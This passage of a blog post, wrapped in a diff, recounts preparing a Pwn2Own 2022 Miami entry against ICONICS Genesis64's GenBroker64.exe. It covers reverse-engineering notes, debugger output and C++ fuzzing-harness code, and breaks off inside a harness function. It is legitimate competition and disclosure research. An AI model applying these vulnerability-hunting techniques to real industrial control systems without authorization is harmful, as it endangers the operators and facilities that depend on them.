@@ -1,0 +1,1218 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <title>Competiting in Pwn2Own 2022 Miami: Paracosme Beyond the Zenith</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="">
+    <meta name="author" content="Axel '0vercl0k' Souchet">
+    <link rel="stylesheet" href="../../../../../theme/css/bootstrap.min.css" type="text/css" />
+    <style type="text/css">
+      body {
+        padding-top: 60px;
+        padding-bottom: 40px;
+      }
+      .sidebar-nav {
+        padding: 9px 0;
+      }
+      .tag-1 {
+        font-size: 13pt;
+      }
+      .tag-2 {
+        font-size: 10pt;
+      }
+      .tag-2 {
+        font-size: 8pt;
+      }
+      .tag-4 {
+        font-size: 6pt;
+     }
+    </style>
+    <link href="../../../../../theme/css/bootstrap-responsive.min.css" rel="stylesheet" />
+    <link href="../../../../../theme/css/font-awesome.css" rel="stylesheet" />
+    <link href="../../../../../theme/css/pygments.css" rel="stylesheet" />
+
+    <!--[if lt IE 9]>
+      <script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <link href="../../../../../feeds/atom.xml" type="application/atom+xml" rel="alternate" title="Diary of a reverse-engineer ATOM Feed" />
+    <link href="../../../../../feeds/rss.xml" type="application/atom+xml" rel="alternate" title="Diary of a reverse-engineer RSS Feed" />
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src='https://www.googletagmanager.com/gtag/js?id=G-MRPDMQ259W'></script>
+<script>
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-MRPDMQ259W');
+</script>
+  </head>
+
+  <body>
+
+    <div class="navbar navbar-fixed-top">
+      <div class="navbar-inner">
+        <div class="container-fluid">
+          <a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+            <span class="icon-bar"></span>
+          </a>
+          <a class="brand" href="../../../../../index.html">Diary of a reverse-engineer </a>
+          <div class="nav-collapse">
+            <ul class="nav">
+              <ul class="nav">
+                    <li><a href="../../../../../archives.html"><i class="icon-th-list"></i>Archives</a></li>
+              </ul>
+
+                <li >
+                    <a href="../../../../../category/debugging.html">
+                      <i class="icon-folder-open icon-large"></i>debugging
+                    </a>
+                </li>
+                <li class="active">
+                    <a href="../../../../../category/exploitation.html">
+                      <i class="icon-folder-open icon-large"></i>exploitation
+                    </a>
+                </li>
+                <li >
+                    <a href="../../../../../category/misc.html">
+                      <i class="icon-folder-open icon-large"></i>misc
+                    </a>
+                </li>
+                <li >
+                    <a href="../../../../../category/obfuscation.html">
+                      <i class="icon-folder-open icon-large"></i>obfuscation
+                    </a>
+                </li>
+                <li >
+                    <a href="../../../../../category/reverse-engineering.html">
+                      <i class="icon-folder-open icon-large"></i>reverse-engineering
+                    </a>
+                </li>
+
+                <li><a href="../../../../../pages/about.html">About</a></li>
+                <li><a href="../../../../../pages/presentations.html">Presentations</a></li>
+
+            </ul>
+          </div><!--/.nav-collapse -->
+        </div>
+      </div>
+    </div>
+
+    <div class="container-fluid">
+      <div class="row">
+        <div class="span9" id="content">
+<section id="content">
+        <article>
+                <header>
+                        <h1>
+                                <a href=""
+                                        rel="bookmark"
+                                        title="Permalink to Competiting in Pwn2Own 2022 Miami: Paracosme Beyond the Zenith">
+                                        Competiting in Pwn2Own 2022 Miami: Paracosme Beyond the Zenith
+                                </a>
+                        </h1>
+                </header>
+                <div class="entry-content">
+                <div class="well">
+<footer class="post-info">
+<span class="label">Date</span>
+<abbr class="published" title="2023-05-05T08:00:00-07:00">
+        <i class="icon-calendar"></i>Fri 05 May 2023
+</abbr>
+<span class="label">By</span>
+<a href="../../../../../author/axel-0vercl0k-souchet.html"><i class="icon-user"></i>Axel "0vercl0k" Souchet</a>
+<span class="label">Category</span>
+<a href="../../../../../category/exploitation.html"><i class="icon-folder-open"></i>exploitation</a>
+
+
+<span class="label">Tags</span>
+	<a href="../../../../../tag/pwn2own-miami.html"><i class="icon-tag"></i>Pwn2Own Miami</a>
+	<a href="../../../../../tag/pwn2own-2022.html"><i class="icon-tag"></i>Pwn2Own 2022</a>
+	<a href="../../../../../tag/ics.html"><i class="icon-tag"></i>ICS</a>
+	<a href="../../../../../tag/paracosme.html"><i class="icon-tag"></i>Paracosme</a>
+	<a href="../../../../../tag/iconics.html"><i class="icon-tag"></i>ICONICS</a>
+	<a href="../../../../../tag/iconics-genesis64.html"><i class="icon-tag"></i>ICONICS Genesis64</a>
+	<a href="../../../../../tag/genesis64.html"><i class="icon-tag"></i>Genesis64</a>
+	<a href="../../../../../tag/0-click-remote-code-execution.html"><i class="icon-tag"></i>0-click remote code execution</a>
+	<a href="../../../../../tag/cve-2022-33318.html"><i class="icon-tag"></i>CVE-2022-33318</a>
+	<a href="../../../../../tag/zdi-22-1041.html"><i class="icon-tag"></i>ZDI-22-1041</a>
+	<a href="../../../../../tag/icsa-22-202-04.html"><i class="icon-tag"></i>ICSA-22-202-04</a>
+	<a href="../../../../../tag/genbroker64exe.html"><i class="icon-tag"></i>GenBroker64.exe</a>
+	<a href="../../../../../tag/exploitation.html"><i class="icon-tag"></i>exploitation</a>
+	<a href="../../../../../tag/memory-corruption.html"><i class="icon-tag"></i>memory-corruption</a>
+</footer><!-- /.post-info -->                </div>
+                <h1 id="introduction">Introduction</h1>
+<p>After participating to Pwn2Own Austin in 2021 and failing to land my <a href="https://github.com/0vercl0k/zenith">remote kernel exploit Zenith</a> (which you can read about <a href="https://doar-e.github.io/blog/2022/03/26/competing-in-pwn2own-2021-austin-icarus-at-the-zenith/">here</a>), I was eager to experience it again. It had been fun and it forced me to look at things that I would never have looked at otherwise. The one thing that I wasn't able to do at the Austin edition in 2021 was to fly on-site and soak in the full experience: getting a huge adrenaline rush on stage, socializing with the other enthusiasts and just having fun.</p>
+<p>So when ZDI announced an in-person competition in <a href="https://www.zerodayinitiative.com/blog/2021/10/22/our-ics-themed-pwn2own-contest-returns-to-miami-in-2022">Miami in 2022</a>.. I was stoked and motivated. I knew nothing about <a href="https://en.wikipedia.org/wiki/Industrial_control_system"><strong>I</strong>ndustrial <strong>C</strong>ontrol <strong>S</strong>ystem</a> software (I still don't to be honest 😅). After googling around, I realized that several of the targets actually ran on Windows 😮 which is the OS I am most familiar with so that's a big plus given the timeline. And yes, the contest was announced at the end of October 2022 and was supposed to happen about 3 months after, in January 2023.</p>
+<p>In this blogpost, I'm hoping to walk you my journey through participating &amp; demonstrating a winning entry on stage in Miami 🛬. If you are not interested in those details and just interested in the exploit that I demonstrated, everything has been released on my GitHub repository <a href="https://github.com/0vercl0k/paracosme">Paracosme</a>. </p>
+<div class="toc"><span class="toctitle">Table of contents:</span><ul>
+<li><a href="#introduction">Introduction</a></li>
+<li><a href="#target-selection">Target selection</a></li>
+<li><a href="#vulnerability-research">Vulnerability research</a><ul>
+<li><a href="#understanding-the-target">Understanding the target</a></li>
+<li><a href="#harnessing-the-target">Harnessing the target</a></li>
+<li><a href="#triaging-findings">Triaging findings</a></li>
+</ul>
+</li>
+<li><a href="#exploit-engineering-building-paracosme">Exploit engineering: Building Paracosme</a><ul>
+<li><a href="#understanding-the-bug">Understanding the bug</a></li>
+<li><a href="#can-i-reclaim-the-chunk-with-controlled-data">Can I reclaim the chunk with controlled data?</a></li>
+<li><a href="#hijacking-control-flow-roping-to-get-arbitrary-native-code-execution">Hijacking control flow &amp; ROPing to get arbitrary native code execution</a></li>
+</ul>
+</li>
+<li><a href="#entering-the-contest">Entering the contest</a></li>
+<li><a href="#wrapping-up">Wrapping up</a></li>
+</ul>
+</div>
+<h1 id="target-selection">Target selection</h1>
+<p>All right, let me set the stage. It is November 2021 in Seattle, the sun sets early, it is cozy, warm inside and I have decided that I am going to try and participate to the contest. As I mentioned in the intro, it taking place in Miami at the end of January 2022 which gives me a bit less than three months to discover an exploitable vulnerability and write a reliable enough exploit for it. Honestly, I thought that timeline was a bit tight as I am only able to invest an hour or two on average per work day (probably double that for weekends). This means that progress is slow and it takes a kind of discipline to put in the hours unconditionally after a full day of work; but that's what it'll take 🫡. And if it doesn't go anywhere, then it doesn't. Oh well, things don't work out in life all the time, nothing new 🤷🏽‍♂️</p>
+<p>I was excited about one thing though.. and it was that I was going to be able to pick a target that runs on Windows. This is an environment that I am very familiar with, and given the timeline I was relieved to not have to fight with <a href="https://sourceware.org/gdb/">gdb</a> / <a href="https://lldb.llvm.org/">lldb</a> 🤢 Basically, lots of time saved that I can sink into understanding better the target; that was awesome.</p>
+<p>But as I said in the introduction, I have no experience whatsoever with anything related to <a href="https://en.wikipedia.org/wiki/Industrial_control_system">ICS</a> software. I don't know what it's supposed to do, where, how. Although I've tried to document myself as much as I could by reading all the literatures I could find, I quickly realized that it just wasn't covered that much by the infosec community.</p>
+<p>In terms of the contest, <a href="https://www.zerodayinitiative.com/">ZDI</a> broke down the contest in four main categories with multiple categories, vectors and different cash prizes. Reading through the rules, I didn't really recognize any kind of vendors or software, it was all very foreign. So I started to look for something that checks a few boxes:</p>
+<ol>
+<li>I want to be able to find a demo version of the software and I want to be able to run it on a regular Windows VM. This means I can introspect the target easily through a debugger. I also learned my lessons from the <a href="https://github.com/0vercl0k/zenith">Zenith</a> exploit and I want to make sure I can debug a potential exploit to stand a chance to have the exploit land during the contest.</li>
+<li>Ideally, the target or sub-components are written in a memory unsafe language like C or C++. It is nicer to reverse-engineer, and it probably contains memory safety issues that I could use.</li>
+<li>Bonus points, if there's existing research / documentation / anything I can build on top of.</li>
+</ol>
+<p>After trying a few things I eventually decided to target <a href="https://iconics.com/Products/GENESIS64">ICONICS Genesis64</a> in the Control Server category via the 0 click over-the-network vector. Practically speaking, this means that you show up to the contest, an ethernet cable is connecting you to the target device and you throw your exploit at one of Genesis64's listening server and need to demonstrate code execution.</p>
+<p>This target matched every point on my list so I felt pretty good about it. <a href="https://aluigi.altervista.org/">Luigi Auriemma</a> published a <a href="https://www.exploit-db.com/exploits/17023">plethora of vulnerabilities</a> affecting the <code>GenBroker64.exe</code> server (which is part of Genesis64) in 2011. A lot of those bugs look pretty powerful and shallow to find which gave me confidence that there has to be plenty more today. At the same time, this was the only public thing I found and it was a decade old which is... a very long time ago.</p>
+<h1 id="vulnerability-research">Vulnerability research</h1>
+<p>I started up the adventure a few weeks after the official announcements and I was able to download the software, install it in a VM and start reverse-engineering the <code>GenBroker64.exe</code> service with laser focus. <code>GenBroker64.exe</code> is a regular Windows program available in both 32 or 64-bit version which will ultimately run on modern Windows 10 64-bit.</p>
+<p>I was confused at first because if you open the file in <a href="https://hex-rays.com/">IDA</a> it thinks it is a .NET binary which was contradicting Luigi's finding I had looked at.</p>
+<p><center><img  width="75%" src="/images/paracosme/net.png" /></center></p>
+<p>I ignored it and focused on finding the code that manages the socket for TCP port 38080. I did find the entry-point and figured that it might be a mixed .NET / C/C++ binary. To be honest, I didn't really spend time trying to understand the whys, instead I just started to get going on the grind. Reverse-engineering it, function by function, building deeper and deeper understanding of the various structures used, the various software abstractions. You know how it goes.</p>
+<h2 id="understanding-the-target">Understanding the target</h2>
+<p>After a month of daily reverse-engineering, I was moving along and to be honest the code wasn't super tricky to understand which was nice. It doesn't mean I understood everything that was going on, but at least I was making progress and felt I was building expertise.</p>
+<p><code>GenBroker64.exe</code> appeared to be some kind of broker, as the name suggests, between a client and maybe some ICS hardware. Who knows. But I can see a first layer of deserialization where the client can send strings, arrays of strings, integers, <a href="https://learn.microsoft.com/en-us/windows/win32/api/oaidl/ns-oaidl-variant">VARIANT</a>s, etc. This layer looks like the layer that was hit hard by Luigi back in 2011 as I can see extra checks added for integer overflows and what not. </p>
+<p>I'm also seeing a lot of use of the Microsoft Foundation Class (MFC) library which I wasn't familiar with. I started to cover more ground and discover various bugs or other low severity security issues like division by zero, null dereferences, infinite recursions, out of bounds reads, etc. Although it felt comforting for a minute, those issues were nowhere near what I needed to pop calc remotely with no user interaction. No cigar.</p>
+<p>After a month and a half of time spent on understanding the targt I felt like I had a grip on what it was doing and how. The clock was ticking and I knew that I could use the built expertise to harness the target quickly and fuzz that layer. I had released my <a href="https://github.com/0vercl0k/wtf">wtf</a> fuzzer a bit of time ago and it seemed like a great tool for the job.</p>
+<p>The plan was to continue exploring the surfaces manually and have the fuzzer run in parallel.</p>
+<h2 id="harnessing-the-target">Harnessing the target</h2>
+<p>All the work I had done to understand the target came really handy at that point. The target used a receive buffer structure that looked like the following:</p>
+<div class="highlight"><pre><span></span><code><span class="k">struct</span><span class="w"> </span><span class="nc">TcpRecvBuffer_t</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="n">TcpRecvBuffer_t</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">memset</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="k">this</span><span class="p">));</span><span class="w"> </span><span class="p">}</span>
+<span class="w">  </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">Vtbl</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">m_hFile</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">m_bCloseOnDelete</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">m_strFileName</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">m_dFoo</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">m_pTM</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">m_nGrowBytes</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">m_nPosition</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">m_nBufferSize</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">m_nFileSize</span><span class="p">;</span>
+<span class="w">  </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">m_lpBuffer</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div>
+
+
+<p>In that structure, there is a pointer to the bytes that will be read by the read function so injecting the testcase in memory was pretty easy. I created a small client to send a large packet such that the buffer is big enough for the largest packet that I wanted to send and I grabbed a snapshot of <code>GenBroker64.exe</code> right after the <code>WSOCK32!recv</code> call:</p>
+<div class="highlight"><pre><span></span><code>GenBroker64+0x83dd0:
+00000001`40083dd0 83f8ff          cmp     eax,0FFFFFFFFh
+
+kd&gt; ub .
+00000001`40083dc0 4053            push    rbx
+00000001`40083dc2 4883ec30        sub     rsp,30h
+00000001`40083dc6 488b4908        mov     rcx,qword ptr [rcx+8]
+00000001`40083dca ff15b8aa0200    call    qword ptr [GenBroker64+0xae888 (00000001`400ae888)]
+
+kd&gt; dqs 00000001`400ae888
+00000001`400ae888  00007ffb`f27e1010 WSOCK32!recv
+
+kd&gt; r @rax
+rax=0000000000001000
+
+kd&gt; kp
+ # Child-SP          RetAddr               Call Site
+00 00000000`0a48fb10 00000001`4008a9fc     GenBroker64+0x83dd0
+01 00000000`0a48fb50 00000001`40086783     GenBroker64+0x8a9fc
+02 00000000`0a48fdf0 00000001`4008609d     GenBroker64+0x86783
+03 00000000`0a48fe20 00007ffc`0cd07bd4     GenBroker64+0x8609d
+04 00000000`0a48ff30 00007ffc`0db0ce71     KERNEL32!BaseThreadInitThunk+0x14
+05 00000000`0a48ff60 00000000`00000000     ntdll!RtlUserThreadStart+0x21
+</code></pre></div>
+
+
+<p>I wrote a small fuzzer module that basically placed the testcase at the end of the pre allocated buffer to make sure that out-of-bounds memory accesses trigger violation when accessing the guard page behind it, and I updated the size and start address directly in the <code>TcpRecvBuffer_t</code> structure that was present on the stack. This is what it looks like:</p>
+<div class="highlight"><pre><span></span><code><span class="kt">bool</span><span class="w"> </span><span class="nf">InsertTestcase</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="kt">uint8_t</span><span class="w"> </span><span class="o">*</span><span class="n">Buffer</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">BufferSize</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">MaxBufferSize</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x1&#39;000</span><span class="p">;</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">BufferSize</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">MaxBufferSize</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="k">struct</span><span class="w"> </span><span class="nc">TcpRecvBuffer_t</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">TcpRecvBuffer_t</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">memset</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="o">*</span><span class="k">this</span><span class="p">));</span><span class="w"> </span><span class="p">}</span>
+<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">Vtbl</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">m_hFile</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">m_bCloseOnDelete</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">m_strFileName</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">m_dFoo</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint32_t</span><span class="w"> </span><span class="n">m_pTM</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">m_nGrowBytes</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">m_nPosition</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">m_nBufferSize</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">m_nFileSize</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">m_lpBuffer</span><span class="p">;</span>
+<span class="w">  </span><span class="p">};</span>
+
+<span class="w">  </span><span class="k">static_assert</span><span class="p">(</span><span class="n">offsetof</span><span class="p">(</span><span class="n">TcpRecvBuffer_t</span><span class="p">,</span><span class="w"> </span><span class="n">m_lpBuffer</span><span class="p">)</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mh">0x48</span><span class="p">);</span>
+
+<span class="w">  </span><span class="c1">//</span>
+<span class="w">  </span><span class="c1">// Calculate and read the TcpRecvBuffer_t pointer saved on the stack.</span>
+<span class="w">  </span><span class="c1">//</span>
+
+<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="n">Gva_t</span><span class="w"> </span><span class="n">Rsp</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Gva_t</span><span class="p">(</span><span class="n">g_Backend</span><span class="o">-&gt;</span><span class="n">GetReg</span><span class="p">(</span><span class="n">Registers_t</span><span class="o">::</span><span class="n">Rsp</span><span class="p">));</span>
+<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="n">Gva_t</span><span class="w"> </span><span class="n">TcpRecvBufferAddr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">g_Backend</span><span class="o">-&gt;</span><span class="n">VirtReadGva</span><span class="p">(</span><span class="n">Rsp</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">Gva_t</span><span class="p">(</span><span class="mh">0x30</span><span class="p">));</span>
+
+<span class="w">  </span><span class="c1">//</span>
+<span class="w">  </span><span class="c1">// Read the TcpRecvBuffer_t structure.</span>
+<span class="w">  </span><span class="c1">//</span>
+
+<span class="w">  </span><span class="n">TcpRecvBuffer_t</span><span class="w"> </span><span class="n">TcpRecvBuffer</span><span class="p">;</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">g_Backend</span><span class="o">-&gt;</span><span class="n">VirtReadStruct</span><span class="p">(</span><span class="n">TcpRecvBufferAddr</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">TcpRecvBuffer</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">fmt</span><span class="o">::</span><span class="n">print</span><span class="p">(</span><span class="s">&quot;VirtWriteDirty failed to write testcase at {}</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
+<span class="w">               </span><span class="n">fmt</span><span class="o">::</span><span class="n">ptr</span><span class="p">(</span><span class="n">Buffer</span><span class="p">));</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="c1">//</span>
+<span class="w">  </span><span class="c1">// Calculate the testcase address so that it is pushed towards the end of the</span>
+<span class="w">  </span><span class="c1">// page to benefits from guard page.</span>
+<span class="w">  </span><span class="c1">//</span>
+
+<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="n">Gva_t</span><span class="w"> </span><span class="n">BufferEnd</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Gva_t</span><span class="p">(</span><span class="n">TcpRecvBuffer</span><span class="p">.</span><span class="n">m_lpBuffer</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">MaxBufferSize</span><span class="p">);</span>
+<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="n">Gva_t</span><span class="w"> </span><span class="n">TestcaseAddr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">BufferEnd</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="n">Gva_t</span><span class="p">(</span><span class="n">BufferSize</span><span class="p">);</span>
+
+<span class="w">  </span><span class="c1">//</span>
+<span class="w">  </span><span class="c1">// Insert testcase in memory.</span>
+<span class="w">  </span><span class="c1">//</span>
+
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">g_Backend</span><span class="o">-&gt;</span><span class="n">VirtWriteDirty</span><span class="p">(</span><span class="n">TestcaseAddr</span><span class="p">,</span><span class="w"> </span><span class="n">Buffer</span><span class="p">,</span><span class="w"> </span><span class="n">BufferSize</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">fmt</span><span class="o">::</span><span class="n">print</span><span class="p">(</span><span class="s">&quot;VirtWriteDirty failed to write testcase at {}</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
+<span class="w">               </span><span class="n">fmt</span><span class="o">::</span><span class="n">ptr</span><span class="p">(</span><span class="n">Buffer</span><span class="p">));</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="c1">//</span>
+<span class="w">  </span><span class="c1">// Set the size of the testcase.</span>
+<span class="w">  </span><span class="c1">//</span>
+
+<span class="w">  </span><span class="n">g_Backend</span><span class="o">-&gt;</span><span class="n">SetReg</span><span class="p">(</span><span class="n">Registers_t</span><span class="o">::</span><span class="n">Rax</span><span class="p">,</span><span class="w"> </span><span class="n">BufferSize</span><span class="p">);</span>
+
+<span class="w">  </span><span class="c1">//</span>
+<span class="w">  </span><span class="c1">// Update the buffer address.</span>
+<span class="w">  </span><span class="c1">//</span>
+
+<span class="w">  </span><span class="n">TcpRecvBuffer</span><span class="p">.</span><span class="n">m_lpBuffer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">TestcaseAddr</span><span class="p">.</span><span class="n">U64</span><span class="p">();</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">g_Backend</span><span class="o">-&gt;</span><span class="n">VirtWriteStructDirty</span><span class="p">(</span><span class="n">TcpRecvBufferAddr</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">TcpRecvBuffer</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">fmt</span><span class="o">::</span><span class="n">print</span><span class="p">(</span><span class="s">&quot;VirtWriteDirty failed to update the TcpRecvBuffer.m_lpBuffer &quot;</span>
+<span class="w">               </span><span class="s">&quot;pointer</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nb">true</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div>
+
+
+<p>As every time you harness a target with <a href="https://github.com/0vercl0k/wtf">wtf</a>, there are events or API calls that can't be executed inside the runtime environment, like i/o or context switching, so you need to take care of them yourself. Depending on your target, it can be as easy as nopping them and as difficult as emulating their behaviors as best as you can. It is a real balancing act because you do not want to force your target into acting a different way than it would when executed for real. For this specific case, I ended up nopping functions that caused file accesses but wouldn't matter much for the code I was fuzzing, and nop'd <code>KERNELBASE!Sleep</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="kt">bool</span><span class="w"> </span><span class="nf">Init</span><span class="p">(</span><span class="k">const</span><span class="w"> </span><span class="n">Options_t</span><span class="w"> </span><span class="o">&amp;</span><span class="n">Opts</span><span class="p">,</span><span class="w"> </span><span class="k">const</span><span class="w"> </span><span class="n">CpuState_t</span><span class="w"> </span><span class="o">&amp;</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">  </span><span class="c1">//</span>
+<span class="w">  </span><span class="c1">// Make ExGenRandom deterministic.</span>
+<span class="w">  </span><span class="c1">//</span>
+<span class="w">  </span><span class="c1">// kd&gt; ub fffff805`3b8287c4 l1</span>
+<span class="w">  </span><span class="c1">// nt!ExGenRandom+0xe0:</span>
+<span class="w">  </span><span class="c1">// fffff805`3b8287c0 480fc7f2        rdrand  rdx</span>
+<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="n">Gva_t</span><span class="w"> </span><span class="n">ExGenRandom</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Gva_t</span><span class="p">(</span><span class="n">g_Dbg</span><span class="p">.</span><span class="n">GetSymbol</span><span class="p">(</span><span class="s">&quot;nt!ExGenRandom&quot;</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0xe4</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">g_Backend</span><span class="o">-&gt;</span><span class="n">SetBreakpoint</span><span class="p">(</span><span class="n">ExGenRandom</span><span class="p">,</span><span class="w"> </span><span class="p">[](</span><span class="n">Backend_t</span><span class="w"> </span><span class="o">*</span><span class="n">Backend</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">DebugPrint</span><span class="p">(</span><span class="s">&quot;Hit ExGenRandom!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<span class="w">        </span><span class="n">Backend</span><span class="o">-&gt;</span><span class="n">Rdx</span><span class="p">(</span><span class="n">Backend</span><span class="o">-&gt;</span><span class="n">Rdrand</span><span class="p">());</span>
+<span class="w">      </span><span class="p">}))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">false</span><span class="p">;</span>
+<span class="w">  </span><span class="p">}</span>
+
+<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="kt">uint64_t</span><span class="w"> </span><span class="n">GenBroker64Base</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">g_Dbg</span><span class="p">.</span><span class="n">GetModuleBase</span><span class="p">(</span><span class="s">&quot;GenBroker64&quot;</span><span class="p">);</span>
+<span class="w">  </span><span class="k">const</span><span class="w"> </span><span class="n">Gva_t</span><span class="w"> </span><span class="n">EndFunct</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Gva_t</span><span class="p">(</span><span class="n">GenBroker64Base</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x85FCC</span><span class="p">);</span>
+<span class="w">  </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">g_Backend</span><span class="o">-&gt;</span><span class="n">SetBreakpoint</span><span class="p">(</span><span class="n">EndFunct</span><span class="p">,</span><span class="w"> </span><span class="p">[](</span><span class="n">Backend_t</span><span class="w"> </span><span class="o">*</span><span class="n">Backend</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">DebugPrint</span><span class="p">(</span><span class="s">&quot;Finished!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
